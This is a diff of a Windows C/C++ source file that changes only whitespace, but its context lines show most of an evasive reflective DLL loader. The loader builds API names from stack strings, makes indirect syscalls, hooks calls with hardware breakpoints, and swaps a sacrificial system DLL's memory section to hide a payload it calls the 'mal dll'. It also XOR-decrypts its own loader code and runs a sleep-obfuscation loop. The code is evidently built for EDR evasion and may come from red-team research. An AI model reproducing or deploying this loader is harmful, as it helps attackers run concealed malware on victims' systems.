@@ -15,8 +15,8 @@
 
 EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 
-    
-    
+
+
 /*--------------CREATE VARIABLES AND  INITIALIZE FUNCTIONS--------------*/
 
     //PE HEADERS VARS
@@ -40,15 +40,15 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     HMODULE dll = NULL;
     FARPROC funcAddress = NULL;
     int ordinal = 0;
-    
+
 
    //base relocation vars
     ULONG_PTR delta = NULL;
     int entriesCount;
-    
+
     //fix Memory Protection variables
     DWORD dwProtection = 0x00;
-    
+
 
     //locate DLL in memory
     PDLL_HEADER pDllHeader = NULL;
@@ -57,7 +57,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     //new PE in memory and memory to free once loaded
     PBYTE pebase = NULL;
     PBYTE toFree = NULL;
-    
+
     //function prototpyes
     fnLoadLibraryA LLA = NULL; //to fix the IAT
     fnRtlAddFunctionTable RAFT = NULL;
@@ -72,7 +72,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     CHAR loadLibraryEx[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
     CHAR getProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };
 
-    
+
     //stack strings and variables for HBP
     CHAR addVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
     CHAR removeVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
@@ -82,14 +82,14 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     CHAR zwclose[] = { 'Z','w','C','l','o','s','e','\0' };
     CHAR ntMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
     CHAR ntCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
-   
+
 
     //NT status variable for syscall return code
     NTSTATUS STATUS = 0x00;
-   
+
     fnAddVectoredExceptionHanlder AVEH = (fnAddVectoredExceptionHanlder)GPAR(GMHR(kernel32), addVectoredExceptionHandler);
     fnRemoveVectoredExceptionHandler RVEH = (fnRemoveVectoredExceptionHandler)GPAR(GMHR(kernel32), removeVectoredExceptionHandler);
-    
+
     //these i do not need to indirect syscall-em
     if ((LLEA = (fnLoadLibraryExA)GPAR(GMHR(kernel32), loadLibraryEx)) == NULL)
         return FALSE;
@@ -102,17 +102,17 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     /*----------------SYSCALL ENUMERATION-------------------------------------*/
     SYSCALL_ENTRY zwFunctions[AmountofSyscalls] = { 0 };
     RetrieveZwFunctions(GMHR(ntdll), zwFunctions);
-    
+
      /*--------------SET HARDWARE BREAKPOINT AND DETOUR FUNCTIONS---------------------*/
-    
-    
+
+
     AVEH(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
-    
+
     zwCloseAddress = GPAR(GMHR(ntdll), zwclose);
     NtMapViewOfSectionAddress = GPAR(GMHR(ntdll), ntMapViewOfSection);
     NtCreateSectionAddress = GPAR(GMHR(ntdll), ntCreateSection);
     if (zwCloseAddress != NULL && NtMapViewOfSectionAddress != NULL && NtCreateSectionAddress != NULL){
-        
+
         setHardwareBreakpoint(zwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress, zwFunctions);
 	}
     /*--------------BRUTE FORCE REFLECTIVE DLL BASE ADDRESS--------------*/
@@ -144,19 +144,19 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 
     //pointer memory to be freed once loaded
     toFree = (PBYTE)dllBaseAddress;
-    
+
     //setting some headers for new steps
     PIMAGE_OPTIONAL_HEADER pImgOptHdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pImgNtHdrs + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
     ImgFileHdr = pImgNtHdrs->FileHeader;
-    
+
     /*------------------------------LOADING SACRIFICAL DLL---------------------*/
-   
+
     PBYTE sacDllBase = NULL;
     CHAR sacDllPath[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };
 
     HMODULE sacModule = NULL;
     sacModule = LLEA(sacDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    
+
 
     /*------------------------------UNSET HARDWARE BREAKPOINT---------------------*/
 
@@ -165,9 +165,9 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     unsetHardwareBreakpoint(3);
 
     RVEH((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
-    
+
     sacDllBase = (PBYTE)sacModule;
-   
+
     /*--------------------PARSE SACRIFICIAL DLL TO RETRIEVE THE SIZE--------------*/
 
     PIMAGE_DOS_HEADER pImgDosHdrSacDll = NULL;
@@ -175,7 +175,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     PVOID memAddressForSyscallSacDll = NULL;
     SIZE_T payloadSizeforSyscallSacDll = NULL;
     ULONG uOldProtectionSacDll = NULL;
-    
+
     if (sacDllBase == NULL) {
         return FALSE;
     }
@@ -195,40 +195,40 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 
     /*----------------RETRIEVE THE DLL HANDLE WITH KERNEL OBJ ENUM---------------------*/
 	HANDLE sacDllHandle = FindSectionHandle(zwFunctions, (fnGetProcessId)GPAR(GMHR(kernel32), getProcessId));
-    
-    
+
+
     /*------------------SWAPPALA STUFF--------------------------*/
-    
+
     PVOID sacDll = NULL;
     HANDLE dllFile = NULL;
     HANDLE sectionHandle = NULL;
     SIZE_T viewSize = NULL;
     payloadSizeforSyscallSacDll = payloadSizeforSyscallSacDll + 24;
     LARGE_INTEGER sectionSize = { payloadSizeforSyscallSacDll };
-   
+
 
     if (STATUS = ZwCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL, zwFunctions[ZwCreateSectionF].SSN, zwFunctions[ZwCreateSectionF].sysretAddr) != 0) {
-    
+
         return FALSE;
-    } 
+    }
     if (STATUS = ZwUnmapViewOfSection(((HANDLE)(LONG_PTR)-1), sacModule, zwFunctions[ZwUnmapViewOfSectionF].SSN, zwFunctions[ZwUnmapViewOfSectionF].sysretAddr) != 0) {
 
         return FALSE;
 
     }
     sacDll = (PVOID)sacModule;
-    
+
     if (STATUS = ZwMapViewOfSection(sectionHandle, ((HANDLE)(LONG_PTR)-1), &sacDll, NULL, NULL, NULL, &payloadSizeforSyscallSacDll, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE, zwFunctions[ZwMapViewOfSectionF].SSN, zwFunctions[ZwMapViewOfSectionF].sysretAddr) != 0) {
-    
+
         return FALSE;
     }
-    
+
     //fixing the baseAddress including the 16 bytes of header
     dllBaseAddress = dllBaseAddress + (16 * sizeof(CHAR));
-    
+
     /*--------------COPY SECTIONS IN MEMORY---------------------------*/
-    
-    //copy needed information for the DLL once loaded 
+
+    //copy needed information for the DLL once loaded
     pebase = (PBYTE)sacDll;
     custom_memcpy_classic(pebase, &sacDllHandle, sizeof(HANDLE));
     pebase += sizeof(HANDLE);
@@ -238,28 +238,28 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     pebase += sizeof(SIZE_T);
     custom_memcpy_classic(pebase, &toFree, sizeof(PBYTE));
     pebase += sizeof(PBYTE);
-    
+
     //retrieve sections information
     PVOID pesectionTemp = NULL;
     SIZE_T sSize = 0x00;
     sSize = sizeof(PIMAGE_SECTION_HEADER) * ImgFileHdr.NumberOfSections;
 
-    //this can be changed but pretty tired, not need to allocate memory 
+    //this can be changed but pretty tired, not need to allocate memory
     if ((STATUS = ZwAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), &pesectionTemp, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, zwFunctions[ZwAllocateVirtualMemoryF].SSN, zwFunctions[ZwAllocateVirtualMemoryF].sysretAddr)) != 0) {
 
         return FALSE;
     }
-    
+
     peSections = (PIMAGE_SECTION_HEADER*)pesectionTemp;
-    
+
     if (peSections == NULL)
         return FALSE;
-    
-   
+
+
     for (int i = 0; i < ImgFileHdr.NumberOfSections; i++) {
         peSections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + 4 + 20 + ImgFileHdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
     }
-  
+
     for (int i = 0; i < ImgFileHdr.NumberOfSections; i++) {
 
         //load sections in memory but not the ReflectiveLoader function
@@ -273,7 +273,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     }
 
     /*--------------FIX IAT TABLE--------------*/
-    
+
     for (size_t i = 0; i < pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
 
 
@@ -313,10 +313,10 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 
         }
     }
-    
+
     /*--------------APPLY BASE RELOCATIONS--------------*/
 
-   
+
     delta = (ULONG_PTR)pebase - pImgOptHdr->ImageBase;
 
     pImgRelocation = (PIMAGE_BASE_RELOCATION)(pebase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
@@ -327,7 +327,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
         pRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgRelocation + 1);
         entriesCount = (int)((pImgRelocation->SizeOfBlock - 8) / 2);
 
-        
+
         for (int i = 0; i < entriesCount; i++) {
 
             switch (pRelocEntry->Type) {
@@ -373,7 +373,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
         pImgRelocation = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(pImgRelocation) + pImgRelocation->SizeOfBlock);
 
     }
-       
+
     /*-------------ADJUST MEMORY PROTECTIONS BASING ON SECTIONS HEADERS*/
     PVOID memAddressForSyscall = NULL;
     SIZE_T payloadSizeforSyscall = NULL;
@@ -381,7 +381,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 
     for (int i = 0; i < ImgFileHdr.NumberOfSections; i++) {
 
-        
+
         if (peSections[i]->Characteristics & IMAGE_SCN_MEM_WRITE) {//write
 
             dwProtection = PAGE_WRITECOPY;
@@ -413,12 +413,12 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
 
             dwProtection = PAGE_EXECUTE_READWRITE;
         }
-       
+
         memAddressForSyscall = (PVOID)(pebase + peSections[i]->VirtualAddress);
         payloadSizeforSyscall = (SIZE_T)peSections[i]->SizeOfRawData;
-        
+
         if ((STATUS = ZwProtectVirtualMemory(((HANDLE)(LONG_PTR)-1), &memAddressForSyscall, &payloadSizeforSyscall, dwProtection, &uOldProtection, zwFunctions[1].SSN, zwFunctions[1].sysretAddr)) != 0) {
-           
+
             return FALSE;
         }
 
@@ -433,7 +433,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
         }
 
     }
-    
+
     /*--------------EXECUTE TLS CALLBACKS--------------*/
 
     if (pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
@@ -459,7 +459,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     return pebase;
 }
 
-//IMPLEMENTED FOR YOLO LOADER 
+//IMPLEMENTED FOR YOLO LOADER
 EXTERN_DLL_EXPORT bool CrazyLoader() {
 
     WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
@@ -475,7 +475,7 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
     PDLL_HEADER pDllHeader = NULL;
     ULONG_PTR dllBaseAddress = NULL;
     dllBaseAddress = (ULONG_PTR)CrazyLoader;
-   
+
     while (TRUE)
     {
 
@@ -503,20 +503,20 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
     if (!dllBaseAddress)
         return FALSE;
 
-    //once base address is found retrieve information to decrypt the loader 
+    //once base address is found retrieve information to decrypt the loader
     PBYTE reflectiveAddr = NULL;
     BYTE KEY[4] = { (BYTE)(pDllHeader->key & 0xFF), (BYTE)((pDllHeader->key >> 8) & 0xFF), (BYTE)((pDllHeader->key >> 16) & 0xFF), (BYTE)((pDllHeader->key >> 24) & 0xFF) };
     reflectiveAddr = (PBYTE)ReflectiveFunction;
-   
+
     for (size_t i = 0, j = 0; i < (pDllHeader->funcSize); i++, j++) {
         if (j >= sizeof(pDllHeader->key)) {
             j = 0;
         }
         reflectiveAddr[i] = reflectiveAddr[i] ^ KEY[j];
     }
-    
+
     pebase = ReflectiveFunction();
-    //re-encrypting the reflective function 
+    //re-encrypting the reflective function
     for (size_t i = 0, j = 0; i < (pDllHeader->funcSize); i++, j++) {
         if (j >= sizeof(pDllHeader->key)) {
             j = 0;
@@ -525,7 +525,7 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
     }
     //removing the encryption key from memory
     pDllHeader->key = 0x0;
-    
+
     //execute the entry point
     pDllMain = (fnDllMain)(pebase + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
 
@@ -535,7 +535,7 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
 
 	return TRUE;
     //return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);
-   
+
 }
 
 
@@ -573,7 +573,7 @@ bool InitializeNtFunctions(PNT_FUNCTIONS ntFunctions)
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (hNtdll == NULL)
     {
-   
+
         return false;
     }
 
@@ -591,10 +591,10 @@ bool InitializeNtFunctions(PNT_FUNCTIONS ntFunctions)
 
     // Check if all function addresses were retrieved successfully
     if (!ntFunctions->NtResumeThread || !ntFunctions->NtWaitForSingleObject || !ntFunctions->NtQueueApcThread ||
-        !ntFunctions->NtGetContextThread || !ntFunctions->NtSetContextThread || !ntFunctions->NtCreateThreadEx || !ntFunctions->NtCreateEvent 
+        !ntFunctions->NtGetContextThread || !ntFunctions->NtSetContextThread || !ntFunctions->NtCreateThreadEx || !ntFunctions->NtCreateEvent
         || !ntFunctions->NtQueryInformationWorkerFactory || !ntFunctions->NtQueryObject || !ntFunctions->NtQuerySystemInformation ) // Modified
     {
-       
+
         return false;
     }
 
@@ -612,46 +612,46 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
     {
-       
-		
+
+
         PBYTE oldMemory = NULL;
-        
+
         //even if unampped it's in the PEB
         PBYTE myBase = (PBYTE)GetModuleHandleA("SRH.dll");
 
-        
+
 
         //retrieve the information left from the reflective loader
         //retrieve handle of sac dll
         PHANDLE pointerToHandle = (PHANDLE)myBase;
         HANDLE sacDllHandle = *pointerToHandle;
-        
+
         //retrieve handle of mal dll
         pointerToHandle++;//+8 bytes
         HANDLE malDllHandle = *pointerToHandle;
-        
+
         //retrieve size of dll in memory
         pointerToHandle++;//+8 bytes
         PSIZE_T pointerToSize = (PSIZE_T)pointerToHandle;
         SIZE_T viewSize = *pointerToSize;
-        
+
         //retrieve the first buffer address
         pointerToHandle++;//+8 bytes
         oldMemory = (PBYTE) *pointerToHandle;
 
         //remove the very first buffer allocated for the reflective DLL
-        if (VirtualFree(oldMemory, 0, MEM_RELEASE) == 0) {    
+        if (VirtualFree(oldMemory, 0, MEM_RELEASE) == 0) {
             //error releasing old buffer
             return FALSE;
         }
-        
-        //here i need to initialize all the NtFunctions 
+
+        //here i need to initialize all the NtFunctions
         NT_FUNCTIONS ntFunctions = {0};
         if (!InitializeNtFunctions(&ntFunctions))
         {
             return FALSE;
         }
-        
+
 
         // handle to ntdll and user32
         HMODULE hNtdll = { 0 };
@@ -675,7 +675,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 			return FALSE;
 		}
 
-		
+
 
         //looping and Sleaping <3
         do {
@@ -690,7 +690,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         } while (TRUE);
 
         return TRUE;
-        
+
     }
         break;
     case DLL_THREAD_ATTACH:
